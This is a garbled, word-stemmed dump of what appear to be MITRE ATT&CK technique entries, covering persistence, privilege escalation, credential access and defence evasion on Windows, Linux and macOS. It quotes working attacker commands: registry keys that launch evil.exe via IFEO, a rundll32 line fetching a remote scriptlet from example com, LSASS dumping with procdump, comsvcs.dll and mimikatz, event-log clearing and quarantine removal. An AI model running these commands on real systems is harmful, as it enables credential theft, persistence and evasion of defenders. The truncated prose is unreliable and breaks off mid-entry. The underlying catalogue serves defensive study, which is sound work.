im fil execut opt ifeo en develop attach debug apply process cre debug pres apply ’ ifeo prepend apply ’ nam effect launch new process debug “ c \dbg\ntsd.exe -g notepad.exe ” microsoft dev blog ifeo mar 2010 ifeo set direct via reg glob flag via gflags tool microsoft gflags mar 2017 ifeo repres < cod > debug < /code > valu reg < cod > hklm\software \wow6432node \microsoft\windows nt\currentversion\image fil execut options\ < execut > < /code > < cod > < execut > < /code > bin debug attach microsoft dev blog ifeo mar 2010 ifeo also en arbit monit program launch spec program sil exit i.e prem termin second non kernel-mode process microsoft sil process exit nov 2017 oddv moe ifeo apr 2018 simil debug sil exit monit en gflags and/or direct mod iefo sil process exit reg valu < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\silentprocessexit\ < /code > microsoft sil process exit nov 2017 oddv moe ifeo apr 2018 exampl evil.exe process start notepad.exe exit oddv moe ifeo apr 2018 < cod > reg ad hklm\software\microsoft\windows nt\currentversion\image fil execut options\notepad.exe /v globalfl /t reg_dword /d 512 < /code > < cod > reg ad hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v reportingmod /t reg_dword /d 1 < /code > < cod > reg ad hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v monitorprocess /d c \temp\evil.exe < /code > simil process inject http valu abus obtain persist privileg esc caus malicy execut load run context sep process comput elast process inject july 2017 inst ifeo mech also provid persist via continu invoc malw also us ifeo defens evas reg invalid debug redirect effect dis vary system sec apply fsec hupigon symantec ushedix jun 2008
rundll32
rundll32.exe program cal execut arbit bin advers tak adv funct proxy execut cod avoid trig sec tool monit execut rundll32.exe process whitel fals posit window us rundll32.exe norm op rundll32.exe us execut control panel item fil .cpl undocu shell32.dl funct < cod > control_rundl < /code > < cod > control_rundllasuser < /code > double-clicking .cpl fil also caus rundll32.exe execut trend micro cpl rundll32 also us execut script javascrib do us syntax simil < cod > rundll32.exe javascrib \ .. \mshtml runhtmlapply document.write getobject script http exampl com/malicious.sct < /code > behavy see us malw powelik sec command lin confus
mod ex serv
window serv config inform includ fil path serv execut recovery programs/command stor reg serv config mod us util sc.exe reg http advers mod ex serv persist malw system us system util us custom tool interact window ap us ex serv typ masquerad http mak detect analys challeng mod ex serv interrupt funct en serv dis otherw common us advers also int corrupt kil serv execut malicy recovery programs/command twit serv recovery nov 2017 microsoft serv recovery feb 2013
trap
advers est persist execut malicy cont trig interrupt sign < cod > trap < /code > command allow program shel spec command execut upon receiv interrupt sign common situ script allow grac termin handl common keyboard interrupt lik < cod > ctrl+c < /code > < cod > ctrl+d < /code > advers us reg cod execut shel encount spec interrupt persist mech trap command follow form < cod > trap 'command list ' sign < /code > command list execut sign receiv trap man cybercit trap stat
dynam link hijack
advers execut malicy payload hijack environ vary dynam link us load shar libr execut prep phas program dynam link load spec absolv path shar libr environ vary fil < cod > ld_preload < /code > linux < cod > dyld_insert_libraries < /code > maco libr spec environ vary load first tak prec system libr funct nam man ld.so tldp shar libr appl doco arch dynam libr vary oft us develop debug bin without nee recompil deconflict map symbol impl custom funct without chang origin libr baeldung ld_preload linux maco hijack dynam link vary grant access victim process mem system/network resourc poss elev privileg method also evad detect sec produc sint execut mask legitim process advers set environ vary via command lin us < cod > export < /code > command < cod > setenv < /code > funct < cod > putenv < /code > funct advers also lev dynam link hijack http export vary shel set vary program us high level syntax python ’ < cod > os.environ < /code > linux advers set < cod > ld_preload < /code > point malicy libr match nam legitim libr request victim program caus op system load advers malicy cod upon execut victim program < cod > ld_preload < /code > set via environ vary < cod > /etc/ld.so.preload < /code > fil man ld.so tldp shar libr libr spec < cod > ld_preload < /code > load map mem < cod > dlop < /code > < cod > mmap < /code > respect cod inject linux maco uninform needl phrack halfdead 1997 brown exploit link maco behavy conceiv linux diff maco dynam libr dyld impl low level advers set < cod > dyld_insert_libraries < /code > environ vary point malicy libr contain nam legitim libr funct request victim program theevilbit dyld_insert_libraries timac dyld_insert_libraries gabilondo dyld_insert_libraries catalin bypass
loc account
advers cre loc account maintain access victim system loc account config org us us remot support serv admin singl system serv sufficy level access < cod > net us /add < /code > command us cre loc account maco system < cod > dscl -create < /code > command us cre loc account account us est second cred access requir persist remot access tool deploy system
commun remov med
advers perform command control comprom host pot disconnect network us remov med transf command system system system would nee comprom lik internet-connected system comprom first second lat mov reply remov med http command fil would relay disconnect system internet-connected system advers direct access
clear window ev log
advers clear window ev log hid act intrud window ev log record comput alert not three system-defined sourc ev system apply sec fiv ev typ er warn inform success audit fail audit ev log clear follow util command < cod > wevtutil cl system < /code > < cod > wevtutil cl apply < /code > < cod > wevtutil cl sec < /code > log also clear mech ev view gui powershel http
email account
advers cre email account us target advers us account cre email provid op lev conduc phish inform http phish http mandy apt1 advers also tak step cult person around email account us soc med account http increas chant success follow-on behavy cre email account also us acquisit infrastruct ex domain http mandy apt1 decreas chant phys tie back op advers mak us dispos email serv trend micro r980 2016
llmnr/nbt-ns poison smb relay
respond llmnr/nbt-ns network traff advers spoof authorit sourc nam resolv forc commun advers control system act us collect relay auth mat link-local multicast nam resolv llmnr netbio nam serv nbt-ns microsoft window compon serv altern method host id llmnr bas upon domain nam system dns form allow host loc link perform nam resolv host nbt-ns ident system loc network netbio nam wikiped llmnr technet netbio advers spoof authorit sourc nam resolv victim network respond llmnr udp 5355 /nbt-ns udp 137 traff know id request host effect poison serv victim commun advers control system request host belong resourc requir identification/authenticat usernam ntlmv2 hash send advers control system advers collect hash inform send wir tool monit port traff network sniff http crack hash offlin brut forc http obtain plaintext password cas advers access system auth path system autom scan us cred attempt auth advers control system ntlmv1/v2 hash interceiv relay access execut cod target system relay step hap conjunct poison also independ byt3bl33d3r ntlm relay sec ide smb relay addit advers encaps ntlmv1/v2 hash vary protocol ldap smb mssql http expand us multipl serv valid ntlm respons sev tool us poison nam serv within loc network nbnspoof metasploit respond http github nbnspoof rapid7 llmnr spoof github respond
fil direct permit mod
advers mod fil direct permissions/attribute evad access control list ac access protect fil hybrid analys icacls1 jun 2018 hybrid analys icacls2 2018 fil direct permit common man ac config fil direct own us appropry permit fil direct ac impl vary platform gen explicit design us group perform act read writ execut etc. mod includ chang spec access right requir tak own fil direct and/or elev permit depend fil direct ’ ex permit en malicy act mod replac delet spec fil direct spec fil direct mod requir step many techn est persist via access feat http boot logon init script http unix shel config mod http tainting/hijack instru binary/configuration fil via hijack execut flow http advers also chang permit symbol link exampl malw particul ransomw mod symbol link assocy set en access fil loc shortcut remot path new_rust_based_ransomware bad_luck_blackcat falconoverwatch_blackcat_attack blackmatter_blackcat fsutil_behavior
lsass mem
advers attempt access cred mat stor process mem loc sec auth subsystem serv lsass us log system gen stor vary cred mat lsass process mem cred mat harvest admin us system us conduc lat mov http us us altern auth mat http wel in-memory techn lsass process mem dump target host analys loc system exampl target host us procdump < cod > procdump -ma lsass.exe lsass_dump < /code > loc mimikatz run us < cod > sekurls :minidump lsassdump.dmp < /code > < cod > sekurls :logonpasswords < /code > built-in window tool comsvcs.dll also us < cod > rundll32.exe c \windows\system32\comsvcs.dll minidump pid lsass.dmp ful < /code > volex exchang maraud march 2021 symantec attack govern sect window sec support provid ssp dlls load lsass process system start load lsa ssp dlls access encrypt plaintext password stor window logged-on us domain password smart card pin ssp config stor two reg key < cod > hklm\system\currentcontrolset\control\lsa\security pack < /code > < cod > hklm\system\currentcontrolset\control\lsa\osconfig\security pack < /code > advers mod reg key ad new ssps load next tim system boot addsecuritypack window ap funct cal graeb 2014 follow ssps us access cred msv interact logon batch logon serv logon do msv auth pack wdigest digest auth protocol design us hypertext transf protocol http simpl auth sec lay sasl exchang technet blog cred protect kerbero pref mut client-server domain auth window 2000 lat credssp provid sso network level auth remot desktop serv technet blog cred protect
linux
advers abus http util perform task schedule init rec fut execut malicy cod http command within linux op system en admin schedule task kifarunix - task schedule linux advers us http linux environ execut program system startup schedule bas persist http also abus conduc remot execut part lat mov run process context spec account advers also abus http break restrict environ us task spawn interact system shel run system command simil http also us privileg esc http bin allow run superus via < cod > sudo < /code > gtfobins
hook
window process oft lev apply program interfac ap funct perform task requir reus system resourc window ap funct typ stor dynamic-link libr dlls export funct hook involv redirect cal funct impl via hook proc interceiv execut design cod respons ev mess keystrok mous input microsoft hook overview elast process inject july 2017 import address tabl iat hook us mod process ’ iat point import ap funct stor elast process inject july 2017 adl softw iat hook oct 2014 mwrinfosecurity dynam hook 2015 inlin hook overwrit first byt ap funct redirect cod flow elast process inject july 2017 hightech bridg inlin hook sept 2011 mwrinfosecurity dynam hook 2015 simil process inject http advers us hook load execut malicy cod within context anoth process mask execut also allow access process mem poss elev privileg inst hook mech also provid persist via continu invoc funct cal norm us malicy hook mech also capt ap cal includ paramet rev us auth cred cred access microsoft trojanspy win32/ursnif.g sept 2017 hook common util rootkit http cont fil process reg key object ord hid malw assocy behavy symantec window rootkit
act scan
advers execut act reconnaiss scan gath inform us target act scan advers prob victim infrastruct via network traff oppos form reconnaiss involv direct interact advers perform diff form act scan depend inform seek gath scan also perform vary way includ us nat feat network protocol icmp botnet scan owasp fingerprint inform scan rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http exploit public-facing apply http
plist mod
advers mod property list fil plist fil execut cod part est persist plist fil us maco apply stor property config set apply serv apply us inform plist fil < cod > info.plist < /code > tel op system handl apply runtim us structure metadat form key valu plist fil form xml bas appl cor found dtd sav text bin form fileinfo plist fil describ advers mod path execut bin ad command lin argu insert key/pair valu plist fil auto-run loc execut upon us logon system startup mod plist fil loc advers also execut malicy dynam libr dylib ad dict contain < cod > dyld_insert_libraries < /code > key combin path malicy dylib < cod > environmentvary < /code > key plist fil upon us logon plist cal execut malicy dylib execut within process spac persist also achiev mod < cod > lsenviron < /code > key apply < cod > info.plist < /code > fil wardl artofmalw volume1
abus elev control mech
advers circumv mech design control elev privileg gain higher-level permit modern system contain nat elev control mech intend limit privileg us perform machin auth grant spec us ord perform task consid high risk advers perform sev method tak adv built-in control mech ord esc privileg system
cre process tok
advers cre new process diff tok esc privileg bypass access control process cre tok result sec context anoth us us feat < cod > createprocesswithtokenw < /code > < cod > runa < /code > microsoft runa cre process diff tok requir cred target us spec privileg imperson us access tok us ex gath via mean tok impersonation/theft http mak imperson tok http
setuid setgid
advers abus config apply setuid setgid bit set ord get cod run diff poss privileg us ’ context linux maco setuid setgid bit set apply bin apply run privileg own us group respect setuid man pag norm apply run cur us ’ context regardless us group own apply howev inst program nee execut elev context funct prop us run spec requir privileg instead cre entry sudo fil must do root us spec setuid setgid flag set apply i.e linux mac fil direct permit mod http < cod > chmod < /code > command set bit bitmask < cod > chmod 4777 fil < /code > via shorthand nam < cod > chmod u+s fil < /code > en setuid bit en setgit bit < cod > chmod 2775 < /code > < cod > chmod g+s < /code > us advers us mech malw mak sur 're abl execut elev context fut osx keydnap malw abus oft part shel escap act bypass execut environ restrict permit altern advers choos find target vuln bin setuid setgid bit already en i.e fil direct discovery http setuid setguid bit ind instead x view fil attribut via < cod > l -l < /code > < cod > find < /code > command also us search fil exampl < cod > find / -perm +4000 2 > /dev/null < /code > us find fil setuid set < cod > find / -perm +2000 2 > /dev/null < /code > us setgid bin bit set abus advers gtfobins suid
winlogon help dll
advers abus feat winlogon execut dlls and/or execut us log winlogon.exe window compon respons act logon/logoff wel sec at sequ sa trig ctrl-alt-delete reg entry < cod > hklm\software \\wow6432node\\ \microsoft\windows nt\currentversion\winlogon\ < /code > < cod > hkcu\software\microsoft\windows nt\currentversion\winlogon\ < /code > us man addit help program funct support winlogon cyl reg persist sept 2013 malicy mod reg key caus winlogon load execut malicy dlls and/or execut spec follow subkey know poss vuln abus cyl reg persist sept 2013 winlogon\notify - point not pack dlls handl winlogon ev winlogon\userinit - point userinit.exe us init program execut us log winlogon\shell - point explorer.exe system shel execut us log advers tak adv feat rep execut malicy cod est persist
system firmw
bio bas input/output system un extens firmw interfac uef extens firmw interfac ef exampl system firmw op softw interfac op system hardw comput wikiped bio wikiped uef uef system firmw lik bio u ef und funct comput mod advers perform assist malicy act cap ex overwrit system firmw giv soph advers mean instal malicy firmw upd mean persist system difficult detect
distribut compon object model
advers us valid account http interact remot machin tak adv distribut compon object model dcom advers perform act logged-on us window compon object model com compon nat window apply program interfac ap en interact softw object execut cod impl on interfac com cli object cal method serv object typ dynam link libr dll execut ex distribut com dcom transp middlew extend funct com beyond loc comput us remot proc cal rpc technolog fireey hunt com jun 2019 microsoft com permit interact loc remot serv com object spec access control list ac reg microsoft process wid com key default admin remot act launch com object dcom microsoft com ac dcom advers op context appropry privileg us remot obtain arbit ev direct shellcod execut off apply enigm outlook dcom lat mov nov 2017 wel window object contain insec method enigm mmc20 com jan 2017 enigm dcom lat mov jan 2017 dcom also execut macro ex docu enigm excel dcom sept 2017 also invok dynam dat exchang http dde execut direct com cre inst microsoft off apply cyberreason dcom dde lat mov nov 2017 bypass nee malicy docu dcom us method remot interact window man instru http msdn wmi
chang default fil assocy
fil op default program us op fil also cal fil assocy handl check fil assocy select stor window reg edit us admin program reg access microsoft chang default program microsoft fil handl admin us built-in assoc util microsoft assoc oct 2017 apply mod fil assocy giv fil extend cal arbit program fil giv extend op system fil assocy list < cod > hkey_classes_root\ extend < /code > exampl < cod > hkey_classes_root\.txt < /code > entry point handl extend loc < cod > hkey_classes_root\ handl < /code > vary command list subkey undernea shel key < cod > hkey_classes_root\ handl \shell\ act \command < /code > exampl < cod > hkey_classes_root\txtfile\shell\open\command < /code > < cod > hkey_classes_root\txtfile\shell\print\command < /code > < cod > hkey_classes_root\txtfile\shell\printto\command < /code > valu key list command execut handl op fil extend advers mod valu contin execut arbit command trendmicro troj-fakeav oct 2012
regsvr32
regsvr32.exe command-line program us reg unreg object link emb control includ dynam link libr dlls window system regsvr32.exe us execut arbit bin microsoft regsvr32 advers tak adv funct proxy execut cod avoid trig sec tool monit execut mod load regsvr32.exe process whitel fals posit window us regsvr32.exe norm op regsvr32.exe also microsoft sign bin regsvr32.exe also us spec bypass process whitel us funct load com scriptlets execut dlls us permit sint regsvr32.exe network proxy aw script load pass uniform resourc loc url fil extern web serv argu invoc method mak chang reg com object act reg execut lolba regsvr32 vary techn oft ref squiblydoo attack us campaign target govern carbon black squiblydoo apr 2016 fireey regsvr32 target mongol gov regsvr32.exe also lev reg com object us est persist via compon object model hijack http carbon black squiblydoo apr 2016
password spray
advers us singl smal list common us password many diff account attempt acquir valid account cred password spray us on password e.g 'password01 ' smal list common us password match complex policy domain login attempt password many diff account network avoid account lockout would norm occ brut forc singl account many password blackhillsinfosec password spray typ man serv common us port us password spray common target serv includ follow ssh 22/tcp telnet 23/tcp ftp 21/tcp netbio / smb / samb 139/tcp 445/tcp ldap 389/tcp kerbero 88/tcp rdp / termin serv 3389/tcp http/http man serv 80/tcp 443/tcp mssql 1433/tcp orac 1521/tcp mysql 3306/tcp vnc 5900/tcp addit man serv advers target singl sign-on sso cloud-bas apply util fed auth protocol wel extern fac email apply off 365 us-cert ta18-068 2018 default environ ldap kerbero connect attempt le lik trig ev smb cre window logon fail ev id 4625
extern proxy
advers us extern proxy act intermedy network commun command control serv avoid direct connect infrastruct many tool ex en traff redirect proxy port redirect includ htran http zxproxy zxportmap trend micro apt attack tool advers us typ proxy man command control commun provid resy fac connect loss rid ex trust commun path avoid susp extern connect proxy us mask destin c2 traff typ impl port redirect comprom system outsid victim environ us purpos wel purchas infrastruct cloud-bas resourc virt priv serv proxy choos bas low lik connect comprom system would investig victim system would commun direct extern proxy internet proxy would forward commun c2 serv
web port capt
advers instal cod extern fac port vpn login pag capt transmit cred us attempt log serv exampl comprom login pag log provid us cred log us serv vary input capt conduc post-compromise us legitim admin access backup meas maintain network access extern remot serv http valid account http part init comprom exploit extern fac web serv volex virt priv keylog
email address
advers gath email address us target ev intern inst ex org public-facing email infrastruct address employ advers easy gath email address sint ready avail expos via onlin access dat set ex soc med http search victim-owned websit http hackers email cnet leak email address could also enum via act mean i.e act scan http prob analys respons auth serv rev valid usernam system grimblog usernameen exampl advers abl enum email address off 365 environ query vary publ avail ap endpoint autodiscov getcredentialtyp github off 365 us enum az act direct reconna gath inform rev opportun form reconnaiss ex search op websites/domain http phish inform http est op resourc ex email account http and/or init access ex phish http brut forc http via extern remot serv http
re-opened apply
start mac o x 10.7 lion us spec certain apply re-opened us reboot machin us do via graph us interfac gui app-by-ap bas property list fil plist contain inform wel loc < cod > ~/library/preferences/com.apple.loginwindow.plist < /code > < cod > ~/library/preferences/byhost/com.apple.loginwindow .plist < /code > advers mod on fil direct includ link malicy execut provid persist mech tim us reboot machin method mac malw persist
ind block
advers attempt block ind ev typ capt sens gath analys could includ malicy redirect microsoft lamin sept 2017 ev dis host-based sens ev trac window etw microsoft ev trac 2018 tamp set control collect flow ev telemetry med ev trac tamp 2018 set stor system config fil and/or reg wel access via admin util powershel http window man instru http etw interrupt achiev multipl way howev direct defin condit us powershel set-etwtraceprovider cmdlet interfac direct reg mak alt cas network-based report ind advers block traff assocy report prev cent analys accompl many mean stop loc process respons forward telemetry and/or cre host-based firewal rul block traff spec host respons aggreg ev sec inform ev man siem produc
redund access
techn deprec pleas us cre account http web shel http extern remot serv http appropry advers us on remot access tool vary command control protocol cred access remot serv maintain access access mech detect mitig on typ tool detect block remov respons org gain ful understand advers tool access advers abl retain access network advers also attempt gain access valid account http us extern remot serv http extern vpns way maintain access despit interrupt remot access tool deploy within target network mandy apt1 advers also retain access cloud-bas infrastruct apply us web shel http on way maintain access network extern access web serv
spearph attach
spearph attach spec vary spearph spearph attach diff form spearph employ us malw attach email form spearph electron del soc engin target spec individ company industry scenario advers attach fil spearph email us rely upon us execut http gain execut many opt attach microsoft off docu execut pdfs arch fil upon op attach pot click past protect advers payload exploit vuln direct execut us system text spearph email us try giv plaus reason fil op explain bypass system protect ord email also contain instruct decrypt attach zip fil password ord evad email bound defens advers frequ manip fil extend icon ord mak attach execut appear docu fil fil exploit on apply appear fil diff on
cach domain cred
advers attempt access cach domain cred us allow auth occ ev domain control unavail microsoft - cach cred window vist new hash form dcc2 domain cach cred vert 2 hash also know ms-cache v2 hash passlib mscache numb default cach cred vary alt per system hash allow pass-the-hash styl attack instead requir password crack http recov plaintext password ir mscache system access tools/utility mimikatz http reg http secretsdump.py us extract cach cred not cach cred window vist der us pbkdf2 passlib mscache
ssh auth key
advers mod ssh < cod > authorized_keys < /code > fil maintain persist victim host linux distribut maco common us key-based auth sec auth process ssh sess remot man < cod > authorized_keys < /code > fil ssh spec ssh key us log us account fil config fil us find us hom direct < cod > lt user-home gt /.ssh/authorized_keys < /code > ssh auth key us edit system ’ ssh config fil mod direct pubkeyauth rsaauth valu “ ye ” ens publ key rsa auth en ssh config fil us loc < cod > /etc/ssh/sshd_config < /code > advers mod ssh < cod > authorized_keys < /code > fil direct script shel command ad adversary-supplied publ key cloud environ advers abl mod ssh authorized_keys fil particul virt machin via command lin interfac rest ap exampl us googl cloud cli ’ “ add-metadata ” command advers ad ssh key us account googl cloud ad metadat googl cloud privileg esc simil az advers upd authorized_keys fil virt machin via patch request ap az upd virt machin ens advers possess correspond priv key log ex us via ssh venaf ssh key abus cybereason linux exim worm authorized_keys fil mod via cloud ap command lin interfac advers achiev privileg esc target virt machin ad key higher-privileged us
kernel mod extend
load kernel mod lkms piec cod load unload kernel upon demand extend funct kernel without nee reboot system exampl on typ mod dev driv allow kernel access hardw connect system linux kernel program us malicy load kernel mod lkms typ kernel-mode rootkit http run highest op system privileg ring 0 linux kernel mod program guid advers us load kernel mod covert persist system evad defens exampl find wild op sourc project volatil phalanx2 crowdstrik linux rootkit github reptil github diamorphin common feat lkm bas rootkit includ hid select hid fil process network act wel log tamp provid auth backdo en root access non-privileged us idefens rootkit overview kernel extend also cal kext us maco load funct onto system simil lkms linux load unload < cod > kextload < /code > < cod > kextunload < /code > command sev exampl find us rsac 2015 san francisco patrick wardl synack sec kernel extend break exampl find wild securel ventir
sec support provid
window sec support provid ssp dlls load loc sec auth lsa process system start load lsa ssp dlls access encrypt plaintext password stor window logged-on us domain password smart card pin ssp config stor two reg key < cod > hklm\system\currentcontrolset\control\lsa\security pack < /code > < cod > hklm\system\currentcontrolset\control\lsa\osconfig\security pack < /code > advers mod reg key ad new ssps load next tim system boot addsecuritypack window ap funct cal graeb 2014
network sec apply
advers gath inform victim network sec apply us target inform network sec apply includ vary detail ex spec deploy firewal cont filt proxies/bastion host advers also target inform victim network-based intrud detect system nid apply rel defend cybersec op advers gath inform vary way direct collect act via act scan http phish inform http nmap firewal nid inform network sec apply also expos advers via onlin access dat set ex search victim-owned websit http gath inform rev opportun form reconnaiss ex search op techn databas http search op websites/domain http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http
im fil execut opt inject
advers est persist and/or elev privileg execut malicy cont trig im fil execut opt ifeo debug ifeo en develop attach debug apply process cre debug pres apply ’ ifeo prepend apply ’ nam effect launch new process debug < cod > c \dbg\ntsd.exe -g notepad.exe < /code > microsoft dev blog ifeo mar 2010 ifeo set direct via reg glob flag via gflags tool microsoft gflags mar 2017 ifeo repres < cod > debug < /code > valu reg < cod > hklm\software \wow6432node \microsoft\windows nt\currentversion\image fil execut options\ < execut > < /code > < cod > lt execut gt < /code > bin debug attach microsoft dev blog ifeo mar 2010 ifeo also en arbit monit program launch spec program sil exit i.e prem termin second non kernel-mode process microsoft sil process exit nov 2017 oddv moe ifeo apr 2018 simil debug sil exit monit en gflags and/or direct mod ifeo sil process exit reg valu < cod > hkey_local_machine\software\microsoft\windows nt\currentversion\silentprocessexit\ < /code > microsoft sil process exit nov 2017 oddv moe ifeo apr 2018 simil access feat http window vist lat wel window serv 2008 lat reg key mod config cmd.exe anoth program provid backdo access debug access program ex utilman.exe reg mod press appropry key combin login screen keyboard connect remot desktop protocol http caus debug program execut system privileg tilbury 2014 simil process inject http valu also abus obtain privileg esc caus malicy execut load run context sep process comput elast process inject july 2017 inst ifeo mech also provid persist via continu trig invoc malw also us ifeo impair defens http reg invalid debug redirect effect dis vary system sec apply fsec hupigon symantec ushedix jun 2008
odbcconf
advers abus odbcconf.exe proxy execut malicy payload odbcconf.exe window util allow config op databas connect odbc driv dat sourc nam microsoft odbcconf.exe odbcconf.exe bin digit sign microsoft advers abus odbcconf.exe bypass apply control solv account pot abus simil regsvr32 http odbcconf.exe < cod > regsvr < /code > flag misus execut dlls ex < cod > odbcconf.exe /s /a lbrace regsvr c \users\public\file.dll rbrace < /code > lolba odbcconf trendmicro squiblydoo aug 2017 trendmicro cobalt group nov 2017
search engin
advers us search engin collect inform victim us target search engin serv typ crawl onlin sit index context provid us spec syntax search spec keyword spec typ cont i.e filetyp securitytrail googl hack exploitdb googlehack advers craft vary search engin query depend inform seek gath threat act us search engin harvest gen inform victim wel us spec query look spillages/leak sensit inform network detail cred inform sourc rev opportun form reconnaiss ex phish inform http search op techn databas http est op resourc ex est account http comprom account http and/or init access ex valid account http phish http
lsass driv
window sec subsystem set compon man enforc sec policy comput domain loc sec auth lsa main compon respons loc sec policy us auth lsa includ multipl dynam link libr dlls assocy vary sec funct run context lsa subsystem serv lsass lsass.exe process microsoft sec subsystem advers target lsass.exe driv obtain execut and/or persist eith replac ad illegitim driv dll side-loading http dll search ord hijack http advers achiev arbit cod execut trig continu lsa op
busy rel
advers gath inform victim busy rel us target inform org ’ busy rel includ vary detail includ second third-party organizations/domain ex man serv provid contract etc connect pot elev network access inform also rev supply chain ship path victim ’ hardw softw resourc advers gath inform vary way direct elicit via phish inform http inform busy rel also expos advers via onlin access dat set ex soc med http search victim-owned websit http threatpost broadvo leak gath inform rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex est account http comprom account http and/or init access ex supply chain comprom http drive-by comprom http trust rel http
video capt
advers lev comput periph dev integr camer webcam apply video cal serv capt video record purpos gath inform im also capt dev apply pot spec interv lieu video fil malw script us interact dev avail ap provid op system apply capt video im video im fil writ disk exfilt lat techn diff screen capt http due us spec dev apply video record rath capt victim screen maco diff malw sampl record us webcam fruitf proton objective-s 2017 review
gatekeep bypass
maco o x apply program download internet spec attribut set fil cal < cod > com.apple.quarantine < /code > attribut read appl gatekeep defens program execut tim provid prompt us allow deny execut ap load onto system usb flash driv opt disk extern hard driv ev driv shar loc network ’ set flag addit util ev lik drive-by download ’ necess set eith complet bypass built-in gatekeep check method mac malw persist pres quarantin flag check xat command < cod > xat /path/to/myapp.app < /code > < cod > com.apple.quarantine < /code > simil giv sudo access elev permit attribut remov xat wel < cod > sudo xat -r -d com.apple.quarantine /path/to/myapp.app < /code > clear quarantin attribut oceanlot o x typ op fil download internet giv quarantin flag sav disk us try op fil apply maco ’ gatekeep step check pres flag ex maco prompt us confirm want run program ev provid url apply com howev bas fil download quarantine-savvy apply bypass gatekeep
softw pack
softw pack method compress encrypt execut pack execut chang fil sign attempt avoid signature-based detect decompress techn decompress execut cod mem util us perform softw pack cal pack exampl pack mpress upx comprehend list know pack avail wikiped ex compress advers cre pack techn leav artifact well-known pack evad defens advers us virt machin softw protect form softw pack protect cod virt machin softw protect transl execut origin cod spec form spec virt machin run virt machin cal run cod eset finf jan 2018
process doppelgäng
advers inject malicy cod process via process doppelgäng ord evad process-based defens wel poss elev privileg process doppelgäng method execut arbit cod address spac sep liv process window transact ntfs txf introduc vist method perform saf fil op microsoft txf ens dat integr txf en on transact handl writ fil giv tim writ handl transact termin handl isol writ read commit vert fil ex tim handl op microsoft bas txf conceiv avoid corrupt txf perform autom rollback system apply fail writ transact microsoft us txf although deprec txf apply program interfac ap stil en window 10 blackh process doppelgäng dec 2017 advers abus txf perform file-less vary process inject http simil process hollow http process doppelgäng involv replac mem legitim process en veil execut malicy cod evad defens detect process doppelgäng us txf also avoid us highly-monitored ap funct < cod > ntunmapviewofsect < /code > < cod > virtualprotectex < /code > < cod > setthreadcontext < /code > blackh process doppelgäng dec 2017 process doppelgäng impl 4 step blackh process doppelgäng dec 2017 transact – cre txf transact us legitim execut overwrit fil malicy cod chang isol vis within context transact load – cre shar sect mem load malicy execut rollback – undo chang origin execut effect remov malicy cod fil system anim – cre process taint sect mem in execut behavy lik result elev privileg sint inject process spawn thu inherit sec context inject process howev execut via process doppelgäng evad detect sec produc sint execut mask legitim process
system network config discovery
advers look detail network config set ip and/or mac address system access inform discovery remot system sev op system admin util ex us gath inform exampl includ arp http ipconfig http / ifconfig http nbtstat http rout http advers also lev network dev cli http network dev gath inform config set ip address config interfac static/dynam rout e.g < cod > show ip rout < /code > < cod > show ip interfac < /code > us-cert-ta18-106a mandy apt41 glob intrud advers us inform system network config discovery http autom discovery shap follow-on behavy includ determin certain access within target network act next
delet cloud inst
advers delet cloud inst perform malicy act attempt evad detect remov evid pres delet inst virt machin remov valu forens artifact evid suspicy behavy inst recov advers also cre cloud inst http lat termin inst achiev object mandy m-trends 2020
cod reposit
advers search publ cod reposit inform victim us target victim stor cod reposit vary third-party websit github gitlab sourceforg bitbucket us typ interact cod reposit web apply command-line util git advers search vary publ cod reposit vary inform victim publ cod reposit oft sourc vary gen inform victim common us program langu libr wel nam employ advers also ident sensit dat includ accid leak cred ap key github cloud serv cred inform sourc rev opportun form reconnaiss ex phish inform http est op resourc ex comprom account http comprom infrastruct http and/or init access ex valid account http phish http not distinct cod reposit http foc collect http priv intern host cod reposit
execut instal fil permit weak
advers execut malicy payload hijack bin us instal process autom execut spec bin part funct perform act permit fil system direct contain target bin permit bin improp set target bin overwrit anoth bin us user-level permit execut origin process origin process thread run high permit level replac bin also execut higher-level permit could includ system anoth vary techn perform tak adv weak common execut self-extracting instal instal process common instal us subdirect within < cod > temp < /code > direct unpack bin dlls ex payload instal cre subdirect fil oft set appropry permit restrict writ access allow execut untrust cod plac subdirect overwrit bin us instal process behavy rel tak adv dll search ord hijack http advers us techn replac legitim bin malicy on mean execut cod high permit level instal also requir elev privileg result privileg esc execut advers control cod behavy rel bypass us account control http sev exampl weak ex common instal report softw vend mozilla_sec_adv_2012 execut instal vuln execut process set run spec tim certain ev system bootup techn also us persist
access feat
advers est persist and/or elev privileg execut malicy cont trig access feat window contain access feat launch key combin us log ex us window logon screen advers mod way program launch get command prompt backdo without log system two common access program < cod > c \windows\system32\sethc.exe < /code > launch shift key press fiv tim < cod > c \windows\system32\utilman.exe < /code > launch window + u key combin press sethc.exe program oft ref sticky key us advers unauth access remot desktop login screen fireey hikit rootkit depend vert window advers tak adv feat diff way common method us advers includ replac access feat bin pointers/reference bin reg new vert window replac bin nee digit sign x64 system bin must resid < cod > systemdir \ < /code > must protect window fil resourc protect wfp/wrp defcon2016 sticky key im fil execut opt inject http debug method lik discov pot workaround requir correspond access feat bin replac simpl bin replac window xp lat wel window serv 2003/r2 lat exampl program < cod > c \windows\system32\utilman.exe < /code > replac cmd.exe anoth program provid backdo access subsequ press appropry key combin login screen sit keyboard connect remot desktop protocol http caus replac fil execut system privileg tilbury 2014 access feat ex also lev simil fash defcon2016 sticky key nar access abus on-screen keyboard < cod > c \windows\system32\osk.exe < /code > magn < cod > c \windows\system32\magnify.exe < /code > nar < cod > c \windows\system32\narrator.exe < /code > display switch < cod > c \windows\system32\displayswitch.exe < /code > ap switch < cod > c \windows\system32\atbroker.exe < /code >
powershel profil
advers gain persist elev privileg certain situ abus powershel http profil powershel profil < cod > profile.ps1 < /code > script run powershel start us logon script custom us environ powershel support sev profil depend us host program exampl diff profil powershel host program powershel consol powershel is vis studio cod admin also config profil apply us host program loc comput microsoft profil advers mod profil includ arbit command funct mod and/or powershel driv gain persist every tim us op powershel sess mod script execut unless < cod > -noprofile < /code > flag us launch eset turl powershel 2019 advers also abl esc privileg script powershel profil load execut account high privileg domain admin wit end shady powershel profil
sip trust provid hijack
